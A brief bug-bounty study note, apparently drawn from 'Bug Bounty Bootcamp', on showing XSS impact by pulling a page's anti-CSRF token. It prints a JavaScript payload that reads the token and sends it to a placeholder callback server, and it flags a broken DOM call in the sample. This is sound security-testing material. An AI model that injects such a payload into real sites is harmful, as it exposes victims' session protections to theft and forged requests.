# XSS Impact: CSRF Token Extraction

- What it is: Use confirmed XSS to read a CSRF token rendered in the victim page and prove access to protected page data.
- Where to look: Pages that expose anti-CSRF tokens in DOM elements or JavaScript-accessible markup.
- Example pattern from the chapter:
```javascript
var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open('GET','http://YOUR_SERVER/?token='+token,true);
xhr.send(null);
```
- Use only a controlled test account and your own callback server.
- Confirm the token value arrives at the callback endpoint before claiming impact.
- Treat this as XSS impact demonstration, not a separate CSRF finding by itself.
- False-positive/edge note: The book's sample uses `getElementsById`; in real code verify the actual DOM API/selector used by the target.
- Remediation: Eliminate XSS; keep sensitive tokens out of unnecessarily exposed DOM locations where practical.

## Source: Bug Bounty Bootcamp, Ch. 6
